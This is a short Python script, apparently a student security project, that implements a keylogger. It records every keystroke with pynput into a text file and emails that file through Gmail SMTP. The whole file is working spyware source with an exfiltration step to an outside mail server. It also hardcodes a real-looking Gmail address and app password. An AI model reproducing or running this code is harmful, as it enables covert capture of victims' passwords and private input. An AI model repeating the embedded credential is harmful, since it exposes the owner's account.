
import pynput
from pynput.keyboard import Key, Listener

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from_addr = "tharilaki82@gmail.com"
toaddress = "tharilaki82@gmail.com"
password = "wstqisdjuuvmgphe"
body = "hiiiii"
keys_information = "key_log.txt"
path = "E:\\Cyber security projects\\Keylogger\\keylogger\\project"
extend = "\\"

keys = []

def send_email(filename, attachment, toaddress):

    msg = MIMEMultipart()

    msg['From'] = from_addr
    msg['To'] = toaddress
    msg['Subject'] = "Log file"

    body = "This is the body"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octed-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Desposion', "attachment; filename %s" %filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_addr, password)
    text = msg.as_string()
    s.sendmail(from_addr, toaddress, text)
    s.quit()

send_email(keys_information, path + extend + keys_information, toaddress)

def press(key):
    global keys
    keys.append(key)
    write_file(keys)
    keys =[]
def release(key):
    pass

def write_file(keys):
    with open(path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if key == Key.space:
                f.write('\n')
                f.close()
            elif hasattr(key, 'char'):
                f.write(key.char)
                f.close()


with Listener(on_press=press, on_release=release) as listener:
    listener.join()


